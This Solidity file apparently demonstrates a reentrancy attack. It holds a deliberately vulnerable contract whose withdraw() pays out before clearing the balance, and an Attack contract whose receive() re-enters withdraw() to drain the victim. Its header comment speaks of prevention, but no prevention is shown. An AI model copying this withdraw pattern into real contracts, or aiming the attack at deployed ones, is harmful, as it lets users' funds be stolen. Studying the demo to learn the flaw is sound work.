//SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.0;

// Reentrancy Attack prevention without Reentrancy guard

contract Vulnerable {
    mapping(address => uint) public balances;

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() public {
        uint bal = balances[msg.sender];
        require(bal > 0);
        (bool sent, ) = msg.sender.call{value: bal}("");
        require(sent, "Failed Transaction");
        balances[msg.sender] = 0;
    }
}

contract Attack {
    Vulnerable public vulnerable;

    constructor(address vulnerableAddress) {
        vulnerable = Vulnerable(vulnerableAddress);
    }

    function attack() external payable {
        vulnerable.deposit{value: 1 ether}();
        vulnerable.withdraw();
    }

    receive() external payable {
        if (address(vulnerable).balance >= 1 ether) {
            vulnerable.withdraw();
        }
    }
}
